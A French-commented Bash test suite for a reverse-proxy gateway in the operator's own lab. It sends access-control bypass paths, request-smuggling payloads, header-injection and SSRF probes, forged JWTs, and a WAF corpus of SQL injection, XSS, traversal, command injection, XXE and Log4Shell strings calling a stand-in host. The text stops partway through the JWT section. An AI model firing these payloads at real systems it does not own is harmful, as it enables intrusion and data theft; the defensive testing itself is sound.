#!/usr/bin/env bash
# Suite de sécurité de la passerelle (défensive, sur SA propre stack) : contournement de contrôle d'accès, usurpation d'IP,
# injection d'en-têtes, request smuggling, corpus d'évasion WAF + faux positifs, cache, WebSocket, JWT, fuites d'information,
# API Admin, droits (jeton à portée limitée, compte sans équipe, périmètre d'équipe), bans de bout en bout, API interne, TLS.
# Verdict PASS/FAIL, code retour = nb d'échecs.
#
#   security.sh seed             certificat TLS de test + routes lab-sec-* via l'API Admin (recrée celles qui existent)
#   security.sh run [sections]   ex. : run waf,jwt,tls ; sans liste = toutes (trust acl ratelimit inject protocol waf cache ws jwt
#                                errleak admin spoof rights bans ephor tarpit decoys challenge ipcontrols geoip mtls asn http3 internal redirect tls)
#   security.sh                  seed + run
#
# Poste de test et réseaux locaux : un pair en réseau privé est un proxy de confiance par défaut (X-Forwarded-For / X-Real-IP
# acceptés) et les plages privées ne sont pas bannies. La section « trust » le détecte ; les contrôles d'usurpation sont alors
# signalés « ignorés » au lieu d'échouer. Le seed place l'IP du poste (ou LAB_RUNNER_CIDR) dans la liste blanche Ephor
# des routes lab-sec-* : sans cela les centaines de 403 volontaires feraient bannir le poste en cours de test.
# Variables : LAB_BRUTE=1 active le test de frein anti brute-force sur le login Admin (25 essais sur un compte inexistant : sans effet sur les comptes du labo ; run-security.sh l'active en local).
#   LAB_STRICT_PASS_FOLLOWS=1 : un second passage en mode strict rejoue ce que le premier ne peut pas prouver ; SECTION_PREFIX préfixe les titres de section.
#   LAB_ALLOW_ACCOUNTS=0 (défaut 1) : la section « rights » ne crée ni compte ni équipe de test dans l'Admin visé.
#   LAB_SIM_HOST : adresse de lab-sim / lab-backend vue de la passerelle (mode cible distante : une IP du LAN).
set -u
. /lab/scripts/hosts.sh
EDGE_HOST=${EDGE_HOST:-goproxify-edge}
SIM=${LAB_SIM_CTL:-http://lab-sim:9999}   # port de contrôle vu du poste de test
SIMH=${LAB_SIM_HOST:-lab-sim}             # adresse des applications simulées vue de la passerelle (une IP du LAN en mode cible)
ROUTES=/lab/scripts/security-routes.json
PASSFILE=/tmp/lab-basic.pass
fail=0; npass=0; nskip=0

ok()   { printf '  \033[32mPASS\033[0m %s\n' "$1"; npass=$((npass+1)); }
ko()   { printf '  \033[31mFAIL\033[0m %s\n' "$1"; fail=$((fail+1)); }
info() { printf '  info  %s\n' "$1"; }
skip() { printf '  skip  %s\n' "$1"; nskip=$((nskip+1)); }
code() { curl -s -o /dev/null -w '%{http_code}' --max-time 20 "$@"; }
u()    { echo "http://lab-sec-$1.lab.test"; }
us()   { echo "https://lab-sec-$1.lab.test"; }
rnd()  { echo "$RANDOM$RANDOM"; }
not200() { # description got : le code ne doit pas être 2xx
  case "$2" in 2*) ko "$1 : accepté ($2)";; *) ok "$1 ($2)";; esac
}
check() { local d=$1 got=$2 x; shift 2; for x in "$@"; do [ "$got" = "$x" ] && { ok "$d ($got)"; return; }; done; ko "$d : obtenu « $got », attendu « $* »"; }
raw() { # host port payload [timeout] -> réponse brute
  exec 3<>"/dev/tcp/$1/$2" || return 1
  printf '%b' "$3" >&3
  timeout "${4:-3}" cat <&3 2>/dev/null; exec 3>&-
}
nresp() { grep -c '^HTTP/1\.[01] ' ; }
first_status() { head -1 | tr -d '\r' | awk '{print $2}'; }
rawE() { raw "$EDGE_HOST" 80 "$@"; }
tlsrun() { echo | timeout 8 openssl s_client -connect "$EDGE_HOST:443" -servername "${SNI:-lab-sec-tls.lab.test}" "$@" 2>&1; }
want() { [ -z "${SECTIONS:-}" ] && return 0; case ",$SECTIONS," in *",$1,"*) return 0;; esac; return 1; }
section() { want "$1" || return 1; echo "== ${SECTION_PREFIX:-}$2 =="; return 0; }

# ------------------------------------------------------------------ seed
# Autorités et certificats clients de test pour la section mtls, écrits dans /fixtures/mtls (dossier partagé avec la passerelle du
# labo). Régénérés quand ils manquent ou touchent à leur fin ; sans /fixtures (déploiement distant) la section est ignorée.
mtls_fixtures() {
  local d=/fixtures/mtls
  [ -d /fixtures ] && [ -w /fixtures ] || return 0
  mkdir -p "$d"
  if [ -f "$d/ca.pem" ] && [ -f "$d/expired.pem" ] && openssl x509 -in "$d/ca.pem" -noout -checkend 1209600 >/dev/null 2>&1; then return 0; fi
  (
    cd "$d" && rm -f ./* 2>/dev/null
    ca() { openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -days 90 -subj "/CN=$1" -keyout "$2.key" -out "$2.pem" \
             -addext 'basicConstraints=critical,CA:TRUE' -addext 'keyUsage=critical,keyCertSign,cRLSign' 2>/dev/null; }
    csr() { printf 'subjectAltName=DNS:%s\nextendedKeyUsage=%s\nkeyUsage=digitalSignature\n' "$2" "$3" > "$1.ext"
            openssl req -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -subj "/CN=$1" -keyout "$1.key" -out "$1.csr" 2>/dev/null; }
    issue() { csr "$1" "$2" "$4"; openssl x509 -req -in "$1.csr" -CA "$3.pem" -CAkey "$3.key" -CAcreateserial -days 30 -extfile "$1.ext" -out "$1.pem" 2>/dev/null; }
    ca lab-mtls-ca ca; ca lab-rogue-ca rogue
    issue client lab-client.lab.test ca clientAuth
    issue client-othersan other.lab.test ca clientAuth
    issue client-rogue lab-client.lab.test rogue clientAuth
    issue client-serverauth lab-client.lab.test ca serverAuth
    # certificat expiré : openssl ca accepte des dates passées, openssl x509 -req non
    csr expired lab-client.lab.test clientAuth
    printf '[ca]\ndefault_ca=c\n[c]\ndatabase=index.txt\nnew_certs_dir=.\nserial=serial.txt\ndefault_md=sha256\npolicy=p\nunique_subject=no\ncopy_extensions=none\n[p]\ncommonName=supplied\n' > ca.cnf
    : > index.txt; echo 01 > serial.txt
    openssl ca -batch -config ca.cnf -cert ca.pem -keyfile ca.key -startdate 20240101000000Z -enddate 20240102000000Z -in expired.csr -out expired.pem -extfile expired.ext >/dev/null 2>&1
  )
  [ -f "$d/expired.pem" ] || echo "ATTENTION : certificat expiré de test non généré (openssl ca)"
}

runner_ip() { hostname -i 2>/dev/null | awk '{print $1}'; }
seed() {
  . /lab/scripts/auth.sh
  [ -f "$PASSFILE" ] || openssl rand -hex 8 > "$PASSFILE"
  local pass cidr tmp icode have name body c
  pass=$(cat "$PASSFILE"); cidr=${LAB_RUNNER_CIDR:-$(runner_ip)/32}
  echo "Liste blanche Ephor des routes lab-sec-* : $cidr"
  tmp=$(mktemp -d)
  openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -days 30 -subj '/CN=*.lab.test' \
    -addext 'subjectAltName=DNS:*.lab.test,DNS:lab.test' -keyout "$tmp/key.pem" -out "$tmp/cert.pem" 2>/dev/null
  icode=$(curl -s -o /tmp/sec-import.out -w '%{http_code}' -X POST "$LAB_ADMIN_URL/api/v1/certs/import" \
    -H "Authorization: Bearer $token" -H 'Content-Type: application/json' \
    -d "$(jq -n --rawfile c "$tmp/cert.pem" --rawfile k "$tmp/key.pem" '{cert_pem:$c,key_pem:$k}')")
  case "$icode" in 2*|409) echo "certificat de test *.lab.test : importé ($icode)";; *) echo "ATTENTION import du certificat : $icode $(head -c 200 /tmp/sec-import.out)";; esac
  rm -rf "$tmp"; sleep 2
  [ "${LAB_TARGET:-0}" = 1 ] || mtls_fixtures
  have=$(curl -s -H "Authorization: Bearer $token" "$LAB_ADMIN_URL/api/v1/proxies" | jq -r '.[]? | "\(.id) \(.name // "")"')
  jq -c '.[]' "$ROUTES" | while read -r r; do
    name=$(echo "$r" | jq -r .host)
    # routes qui n'ont de sens que sur le labo local (base GeoIP montée dans la passerelle, liste blanche d'Ephor testée avec sa config globale)
    if [ "${LAB_TARGET:-0}" = 1 ]; then case $name in lab-sec-geo.*|lab-sec-wl.*|lab-sec-mtls*) continue ;; esac; fi
    # une route restée d'un passage précédent peut avoir une ancienne configuration ou un autre mot de passe : toujours la recréer
    old=$(echo "$have" | awk -v n="$name" '$2 == n {print $1}')
    if [ -n "$old" ]; then
      curl -s -o /dev/null -X DELETE -H "Authorization: Bearer $token" "$LAB_ADMIN_URL/api/v1/proxies/$old"
      printf '%-34s supprimée avant recréation\n' "$name"; sleep 1
    fi
    body=$(echo "$r" | jq -c --arg c "$cidr" '{config: (.config + {host: .host, type: "http", ephor_whitelist: ((.config.ephor_whitelist // []) + [$c])})}' | sed "s/__BASIC_PASS__/$pass/g; s#//lab-sim:#//$SIMH:#g")
    c=$(curl -s -o /tmp/sseed.out -w '%{http_code}' -X POST "$LAB_ADMIN_URL/api/v1/proxies" \
      -H "Authorization: Bearer $token" -H 'Content-Type: application/json' -d "$body")
    printf '%-34s (%s)\n' "$name" "$c"
    case "$c" in 2*) ;; *) jq -r '(.dry_run.errors // [])[] | "  erreur : " + .' /tmp/sseed.out 2>/dev/null || head -c 300 /tmp/sseed.out; echo ;; esac
  done
  for _ in $(seq 1 "${LAB_ROUTE_WAIT:-40}"); do [ "$(code "$(u plain)/whoami")" = 200 ] && break; sleep 1; done
  if [ "$(code "$(u plain)/whoami")" = 200 ]; then echo "lab-sec-plain opérationnelle"; else diagnose_plain; fi
}

# La route de référence ne répond pas 200 : sépare « le backend est mort » de « la passerelle ne le joint pas » et de « la route n'est pas appliquée »
diagnose_plain() {
  local via direct
  via=$(code "$(u plain)/whoami"); direct=$(code "http://$SIMH:9001/whoami")
  echo "ATTENTION : lab-sec-plain ne répond pas 200"
  echo "  via la passerelle ($EDGE_HOST, Host lab-sec-plain.lab.test) : $via"
  echo "  backend $SIMH:9001 joint directement depuis le poste de test : $direct"
  if [ "$direct" = 200 ]; then
    case "$via" in
      502|503|504|000) echo "  -> la passerelle ne joint pas $SIMH:9001 : pare-feu entre elle et le poste de test (Windows : profil réseau Privé, règle entrante vers les ports 9000-9008 et 9999 depuis l'IP de la passerelle)." ;;
      404) echo "  -> route non appliquée par la passerelle (propagation lente, ou la passerelle visée n'est pas celle de l'Admin) : relancer avec LAB_ROUTE_WAIT=180." ;;
      301|302|307|308) echo "  -> la passerelle redirige tout le HTTP (vers HTTPS ?) : la suite attend du HTTP clair sur *.lab.test." ;;
      *) echo "  -> réponse inattendue de la passerelle." ;;
    esac
  else
    echo "  -> le backend de test est injoignable depuis le poste de test lui-même."
  fi
}

preflight() {
  [ "$(code "$SIM/ctl/stats")" = 200 ] || { echo "  ABORT lab-sim injoignable ($SIM)"; exit 1; }
  for _ in $(seq 1 30); do [ "$(code "$(u plain)/whoami")" = 200 ] && return; sleep 2; done
  echo "  ABORT lab-sec-plain.lab.test indisponible : suite non exécutée (security.sh seed fait ? voir le diagnostic du seed)"; exit 1
}
guard() { # détecte un bannissement du poste de test en cours de run
  [ "$(code "$(u plain)/whoami")" = 200 ] || echo "  WARN  lab-sec-plain ne répond plus 200 : poste de test banni (Ephor, CrowdSec) ? Les résultats suivants sont faussés."
}

# ------------------------------------------------------------------ sections
TRUSTED=0; TRUST_DONE=0; TRUST_CODE=; TRUST_REAL=
detect_trust() { # renseigne TRUSTED (1 = le poste de test peut choisir son IP vue par la passerelle), une seule fois
  [ $TRUST_DONE = 1 ] && return
  local out
  TRUST_CODE=$(code -H 'X-Forwarded-For: 203.0.113.9' -H 'X-Real-IP: 203.0.113.9' "$(u plain)/echo")
  out=$(curl -s -H 'X-Forwarded-For: 203.0.113.9' -H 'X-Real-IP: 203.0.113.9' "$(u plain)/echo")
  TRUST_REAL=$(echo "$out" | jq -r '.headers["X-Real-Ip"][0] // ""' 2>/dev/null)
  # Un 403 prouve aussi la confiance : l'IP annoncée (plage de documentation, filtrée par les profils IP) a remplacé l'IP réelle.
  if [ "$TRUST_REAL" = 203.0.113.9 ] || [ "$TRUST_CODE" = 403 ]; then TRUSTED=1; else TRUSTED=0; fi
  TRUST_DONE=1
}
t_trust() { section trust "Poste de test : proxy de confiance ?" || return
  detect_trust
  if [ $TRUSTED = 1 ]; then info "poste de test traité comme proxy de confiance (IP annoncée reprise, code $TRUST_CODE) : réseau privé, comportement par défaut. Les contrôles d'usurpation d'IP sont ignorés."
  else ok "X-Real-IP usurpé non repris (backend voit « $TRUST_REAL »)"; fi
}

t_acl() { section acl "Contournement du contrôle d'accès par le chemin (location /api/v1/admin protégée)" || return
  local pass p c; pass=$(cat "$PASSFILE" 2>/dev/null)
  check "référence : accès protégé sans identifiants" "$(code "$(u acl)/api/v1/admin/x")" 401
  [ -n "$pass" ] && check "référence : bons identifiants" "$(code -u "lab:$pass" "$(u acl)/api/v1/admin/x")" 200
  for p in '//api/v1/admin/x' '/./api/v1/admin/x' '/api/./v1/admin/x' '/x/../api/v1/admin/x' '/api/v1/admin/../admin/x' '/api/v1//admin/x' \
           '/api/v1/%61dmin/x' '/api/v1/%41dmin/x' '/API/V1/ADMIN/x' '/api/v1/admin;a=b/x' '/api%2fv1/admin/x' '/api/v1/admin%2e/x' \
           '/api/v1/admin%00/x' '/api/v1/admin%5cx' '/%2e/api/v1/admin/x' '/api/v1/admin%2f..%2fadmin/x' '/api/v1/admin/%2e%2e/admin/x'; do
    c=$(code --path-as-is "$(u acl)$p")
    case "$c" in 200) ko "contournement : « $p » accessible sans identifiants (200)";; *) ok "« $p » non accessible sans identifiants ($c)";; esac
  done
  c=$(code -H 'X-Original-URL: /api/v1/admin/x' -H 'X-Rewrite-URL: /api/v1/admin/x' "$(u acl)/whoami"); info "X-Original-URL / X-Rewrite-URL sur un chemin libre : $c"
  check "méthode inhabituelle sur chemin protégé" "$(code -X PUT "$(u acl)/api/v1/admin/x")" 401
  check "en-tête Authorization vide" "$(code -H 'Authorization: Basic' "$(u acl)/api/v1/admin/x")" 401
  check "identifiants incorrects" "$(code -u lab:faux "$(u acl)/api/v1/admin/x")" 401
}

t_ratelimit() { section ratelimit "Rate-limit : débit et contournement par X-Forwarded-For" || return
  local n i
  detect_trust
  n=$(for i in $(seq 1 40); do code "$(u ratelimit)/whoami"; echo; done | grep -c 429)
  [ "$n" -ge 10 ] && ok "40 requêtes en rafale : $n en 429" || ko "rate-limit inefficace : $n/40 en 429"
  sleep 3
  if [ $TRUSTED = 1 ]; then if [ "${LAB_STRICT_PASS_FOLLOWS:-0}" = 1 ]; then info "rotation de X-Forwarded-For : jouée dans le second passage (GPX_TRUSTED_PROXIES=none)"; else skip "rotation de X-Forwarded-For : ignorée, le poste est un proxy de confiance (la clé suit l'IP annoncée par conception)"; fi
  else
    n=$(for i in $(seq 1 40); do code -H "X-Forwarded-For: 198.51.100.$i" "$(u ratelimit)/whoami"; echo; done | grep -c 429)
    [ "$n" -ge 10 ] && ok "rotation de X-Forwarded-For sans effet : $n/40 en 429" || ko "rate-limit contourné par X-Forwarded-For : $n/40 en 429"
  fi
}

t_inject() { section inject "Injection d'en-têtes, Host forgé, SSRF par la ligne de requête" || return
  local out c h
  out=$(rawE "GET /echo?x=a%0d%0aX-Injected:%201 HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -qi '^x-injected\|"X-Injected"' && ko "CRLF encodé dans l'URL : en-tête injecté" || ok "CRLF encodé dans l'URL : aucun en-tête injecté"
  out=$(rawE "GET /echo HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nX-A: b\r\n X-Injected: 1\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -q '"X-Injected"' && ko "obs-fold : en-tête injecté chez le backend" || ok "obs-fold : pas d'en-tête injecté ($(echo "$out" | first_status))"
  for h in $SIMH:9999 $SIMH localhost 127.0.0.1 169.254.169.254 lab-sec-plain.lab.test.evil.test evil.test '[::1]' ''; do
    c=$(code -H "Host: $h" "http://$EDGE_HOST/ctl/stats"); [ "$c" = 200 ] && ko "Host « $h » : l'API de contrôle est joignable (200)" || ok "Host « $h » refusé ($c)"
  done
  out=$(rawE "GET http://$SIMH:9999/ctl/stats HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -q '"healthy"' && ko "URI absolue vers le port de contrôle interne : réponse du backend interne (SSRF)" || ok "URI absolue vers le port de contrôle interne : ignorée ($(echo "$out" | first_status))"
  out=$(rawE "GET /ctl/stats HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nX-Forwarded-Host: $SIMH:9999\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -q '"healthy"' && ko "X-Forwarded-Host détourne vers le port de contrôle" || ok "X-Forwarded-Host sans effet sur le routage"
  out=$(curl -s -H 'X-Forwarded-Host: evil.test' -H 'X-Forwarded-Proto: gopher' "$(u plain)/echo")
  check "X-Forwarded-Host client non transmis tel quel au backend" "$(echo "$out" | jq -r '.headers["X-Forwarded-Host"][0] // ""')" lab-sec-plain.lab.test ""
  out=$(curl -s -H 'Host: lab-sec-plain.lab.test:80@evil.test' "http://$EDGE_HOST/echo"); info "Host avec userinfo : $(echo "$out" | head -c 80)"
}

smug() { # description payload : au plus une réponse, jamais 2xx pour la requête dissimulée
  local out n
  out=$(rawE "$2")
  n=$(echo "$out" | nresp)
  [ "$n" -le 1 ] && ok "$1 : $n réponse ($(echo "$out" | first_status))" || ko "$1 : $n réponses (requête dissimulée traitée ?)"
}
t_protocol() { section protocol "Smuggling, méthodes, limites et entrées malformées" || return
  local H='Host: lab-sec-plain.lab.test' out c big
  smug "CL.TE" "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE.CL" "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET /whoami HTTP/1.1\r\n$H\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
  smug "TE avec espace avant « : »" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding : chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE obfusqué (xchunked)" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding: xchunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE avec tabulation" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE en double" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  out=$(rawE "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: 5\r\nContent-Length: 6\r\nConnection: close\r\n\r\n12345")
  check "Content-Length en double et différents" "$(echo "$out" | first_status)" 400
  out=$(rawE "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: -1\r\nConnection: close\r\n\r\n")
  check "Content-Length négatif" "$(echo "$out" | first_status)" 400
  out=$(rawE "CONNECT $SIMH:9999 HTTP/1.1\r\nHost: $SIMH:9999\r\nConnection: close\r\n\r\n")
  case "$(echo "$out" | first_status)" in 2*) ko "CONNECT accepté : tunnel vers le réseau interne";; *) ok "CONNECT refusé ($(echo "$out" | first_status))";; esac
  out=$(rawE "GET /whoami HTTP/9.9\r\n$H\r\nConnection: close\r\n\r\n"); case "$(echo "$out" | first_status)" in 400|505) ok "version HTTP inconnue ($(echo "$out" | first_status))";; "") ok "version HTTP inconnue : connexion fermée";; *) ko "version HTTP inconnue acceptée ($(echo "$out" | first_status))";; esac
  big=$(head -c 120000 /dev/zero | tr '\0' 'a')
  c=$(code "$(u plain)/$big"); case "$c" in 414|431|400|404) ok "URI de 120 Ko refusée ($c)";; 2*) ko "URI de 120 Ko acceptée";; *) ko "URI de 120 Ko : $c (attendu 414/431/400)";; esac
  c=$(code -H "X-Big: $big" "$(u plain)/whoami"); case "$c" in 431|400) ok "en-tête de 120 Ko refusé ($c)";; *) ko "en-tête de 120 Ko : $c (attendu 431/400)";; esac
  c=$(for i in $(seq 1 600); do printf -- '-H X-H%s:v ' "$i"; done | xargs curl -s -o /dev/null -w '%{http_code}' --max-time 20 "$(u plain)/whoami" 2>/dev/null); info "600 en-têtes : $c"
  c=$(code --path-as-is "$(u plain)/%00"); case "$c" in 5*) ko "octet nul dans le chemin : $c";; *) ok "octet nul dans le chemin ($c)";; esac
  c=$(code --path-as-is "$(u plain)/%ff%fe"); case "$c" in 5*) ko "UTF-8 invalide dans le chemin : $c";; *) ok "UTF-8 invalide dans le chemin ($c)";; esac
  c=$(code -X TRACE "$(u plain)/"); check "TRACE" "$c" 405
  c=$(code -X FOOBAR "$(u plain)/whoami"); info "méthode inconnue FOOBAR : $c"
}

# corpus : description|méthode|url-suffixe|corps|en-têtes supplémentaires (séparés par ;;)
waf_block() { local d=$1 m=$2 path=$3 body=${4:-} hdrs=${5:-} args=() h c IFS_OLD=$IFS
  IFS=';;'; for h in $hdrs; do [ -n "$h" ] && args+=(-H "$h"); done; IFS=$IFS_OLD
  if [ -n "$body" ]; then c=$(code -X "$m" --path-as-is "${args[@]}" --data-binary "$body" "$(u waf)$path"); else c=$(code -X "$m" --path-as-is "${args[@]}" "$(u waf)$path"); fi
  [ "$c" = 403 ] && ok "bloqué : $d" || ko "non bloqué : $d ($c)"; }
waf_pass() { local d=$1 path=$2 body=${3:-} hdrs=${4:-} args=() c
  [ -n "$hdrs" ] && args+=(-H "$hdrs")
  if [ -n "$body" ]; then c=$(code -X POST "${args[@]}" --data-binary "$body" "$(u waf)$path"); else c=$(code "${args[@]}" "$(u waf)$path"); fi
  [ "$c" = 200 ] && ok "faux positif évité : $d" || ko "faux positif : $d ($c)"; }
t_waf() { section waf "WAF : corpus d'attaques et d'évasions (block) + faux positifs" || return
  local J='Content-Type: application/json' F='Content-Type: application/x-www-form-urlencoded'
  waf_block "SQLi OR 1=1" GET "/?id=1%27%20OR%20%271%27%3D%271"
  waf_block "SQLi UNION SELECT (casse mixte)" GET "/?id=1%20UnIoN%20SeLeCt%201,2,3"
  waf_block "SQLi UNION/**/SELECT (commentaire)" GET "/?id=1%20UNION/**/SELECT/**/1,2"
  waf_block "SQLi booléenne avec commentaire" GET "/?id=1%27%20AND%201%3D1--%20-"
  waf_block "SQLi requêtes empilées" GET "/?id=1%3BDROP%20TABLE%20users--"
  waf_block "SQLi temporelle" GET "/?id=1%20AND%20SLEEP(5)"
  waf_block "SQLi dans un corps JSON" POST "/echo" "{\"q\":\"' OR 1=1--\"}" "$J"
  waf_block "SQLi dans un corps formulaire" POST "/echo" "user=admin'--&pw=x" "$F"
  waf_block "SQLi dans un cookie" GET "/" "" "Cookie: sid=1' OR '1'='1"
  waf_block "XSS <script>" GET "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  waf_block "XSS <img onerror>" GET "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
  waf_block "XSS <svg onload>" GET "/?q=%3Csvg%2Fonload%3Dalert(1)%3E"
  waf_block "XSS javascript: dans un paramètre" GET "/?url=javascript:alert(document.cookie)"
  waf_block "XSS dans un corps JSON" POST "/echo" '{"c":"<script>alert(1)</script>"}' "$J"
  waf_block "traversal ../ encodé %2f" GET "/?f=..%2f..%2f..%2fetc%2fpasswd"
  waf_block "traversal ....//" GET "/?f=....//....//....//etc/passwd"
  waf_block "traversal %2e%2e/" GET "/?f=%2e%2e/%2e%2e/etc/passwd"
  waf_block "fichier système en paramètre" GET "/?file=/etc/passwd"
  waf_block "injection de commande ;cat" GET "/?c=%3Bcat%20%2Fetc%2Fpasswd"
  waf_block "injection de commande \$(id)" GET "/?c=%24(id)"
  waf_block "injection de commande ||" GET "/?c=1%20%7C%7C%20id"
  waf_block "SSRF métadonnées cloud" GET "/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
  waf_block "SSRF file://" GET "/?url=file%3A%2F%2F%2Fetc%2Fpasswd"
  waf_block "XXE (entité externe)" POST "/echo" '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>' "Content-Type: application/xml"
  waf_block "Log4Shell dans un en-tête" GET "/" "" 'User-Agent: ${jndi:ldap://x.test/a}'
  waf_block "Log4Shell obfusqué (lower)" GET "/" "" 'X-Api-Version: ${${lower:j}ndi:${lower:l}dap://x.test/a}'
  waf_block "Log4Shell dans l'URL" GET "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D"
  waf_block "SSTI {{7*7}}" GET "/?n=%7B%7B7*7%7D%7D"
  waf_block "SSTI \${7*7}" GET "/?n=%24%7B7*7%7D"
  waf_block "SQLi dans un corps en chunked" POST "/echo" "q=1' OR '1'='1" "Transfer-Encoding: chunked;;$F"
  waf_block "outil d'attaque (User-Agent sqlmap)" GET "/" "" "User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)"
  c=$(code "$(u waf)/?id=1%2527%2520OR%25201%253D1"); info "SQLi en double encodage %2527 (inoffensif sauf double décodage côté application) : $c"
  waf_pass "apostrophe légitime (O'Brien)" "/?q=O%27Brien"
  waf_pass "phrase contenant select/from" "/?q=select+an+option+from+the+list"
  waf_pass "texte français (union européenne)" "/?q=union+europ%C3%A9enne+et+s%C3%A9lection"
  waf_pass "nom de fichier avec points (report..final.pdf)" "/?f=report..final.pdf"
  waf_pass "JSON avec apostrophe et mot « drop »" "/echo" '{"name":"D'"'"'Artagnan","bio":"drop by anytime"}' "$J"
  waf_pass "formule 1+1=2" "/?q=1%2B1%3D2"
  waf_pass "chemin statique javascript" "/static/javascript/app.js"
  waf_pass "corps de formulaire ordinaire" "/echo" "name=Alice&comment=Bonjour+tout+le+monde" "$F"
}

t_cache() { section cache "Cache : fuite entre utilisateurs et empoisonnement" || return
  local k=$(rnd) a b
  a=$(curl -s -H "Authorization: Bearer tok-$k" "$(u cache)/me?k=$k"); b=$(curl -s "$(u cache)/me?k=$k")
  case "$b" in *"tok-$k"*) ko "cache : réponse d'une requête avec Authorization servie à un anonyme ($b)";; *) ok "requête avec Authorization non resservie à un anonyme ($b)";; esac
  k=$(rnd)
  a=$(curl -s -H "Cookie: sid=alice-$k" "$(u cache)/me?k=$k")
  b=$(curl -s "$(u cache)/me?k=$k")
  case "$b" in *"alice-$k"*) ko "cache deception : la réponse personnalisée d'un utilisateur est servie à un anonyme ($b)";; *) ok "réponse personnalisée non servie à un anonyme ($b)";; esac
  k=$(rnd); curl -s -o /dev/null -H "Cookie: sid=bob-$k" "$(u cache)/me?k=$k"; a=$(curl -s -H "Cookie: sid=carol-$k" "$(u cache)/me?k=$k")
  case "$a" in *"bob-$k"*) ko "cache : la réponse de bob est servie à carol";; *) ok "réponses de deux utilisateurs distincts non mélangées ($a)";; esac
  k=$(rnd); curl -s -o /dev/null -H 'X-Forwarded-Host: evil.test' "$(u cache)/reflect?k=$k"; b=$(curl -s "$(u cache)/reflect?k=$k")
  case "$b" in *evil.test*) ko "empoisonnement : X-Forwarded-Host client servi aux autres ($b)";; *) ok "pas d'empoisonnement par X-Forwarded-Host ($b)";; esac
}

ws_hs() { # origin -> sortie brute
  exec 3<>"/dev/tcp/$EDGE_HOST/80" || return 1
  printf 'GET /ws HTTP/1.1\r\nHost: lab-sec-ws.lab.test\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: %s\r\n\r\n' "$1" >&3
  timeout 2 cat <&3 | cat -v | head -3; exec 3>&-
}
t_ws() { section ws "WebSocket : origine (détournement entre sites)" || return
  case "$(ws_hs https://app.lab.test)" in *"101 "*) ok "origine autorisée : upgrade 101";; *) ko "origine autorisée refusée";; esac
  case "$(ws_hs https://evil.test)" in *"101 "*) ko "origine https://evil.test acceptée alors que cors.allowed_origins la limite à app.lab.test";; *) ok "origine étrangère refusée";; esac
  case "$(ws_hs null)" in *"101 "*) ko "origine « null » acceptée";; *) ok "origine « null » refusée";; esac
}

jwt() { curl -s "$SIM/ctl/jwt?$1"; }
t_jwt() { section jwt "JWT : jetons valides, forgés, expirés, confusion d'algorithme" || return
  local t c b
  t=$(jwt ""); check "jeton valide (RS256)" "$(code -H "Authorization: Bearer $t" "$(u jwt)/whoami")" 200
  check "header_name=Authorization (jeton valide) : le préfixe « Bearer » doit être retiré" "$(code -H "Authorization: Bearer $t" "$(u jwt-authz)/whoami")" 200
  check "jeton valide (ES256, clé EC du JWKS)" "$(code -H "Authorization: Bearer $(jwt 'alg=ES256')" "$(u jwt)/whoami")" 200
  check "jeton valide (EdDSA, clé Ed25519 du JWKS)" "$(code -H "Authorization: Bearer $(jwt 'alg=EdDSA')" "$(u jwt)/whoami")" 200
  check "ES256 : charge utile modifiée (signature invalide)" "$(code -H "Authorization: Bearer $(jwt 'alg=ES256&tamper=1')" "$(u jwt)/whoami")" 401
  check "EdDSA : charge utile modifiée (signature invalide)" "$(code -H "Authorization: Bearer $(jwt 'alg=EdDSA&tamper=1')" "$(u jwt)/whoami")" 401
  check "header_name=Authorization : schéma « bearer » en minuscules" "$(code -H "Authorization: bearer $t" "$(u jwt-authz)/whoami")" 200
  check "aucun jeton" "$(code "$(u jwt)/whoami")" 401
  check "jeton alg=none" "$(code -H "Authorization: Bearer $(jwt 'alg=none')" "$(u jwt)/whoami")" 401
  check "confusion RS/HS (HS256 signé avec la clé publique)" "$(code -H "Authorization: Bearer $(jwt 'alg=HS256')" "$(u jwt)/whoami")" 401
  check "charge utile modifiée (signature invalide)" "$(code -H "Authorization: Bearer $(jwt 'tamper=1')" "$(u jwt)/whoami")" 401
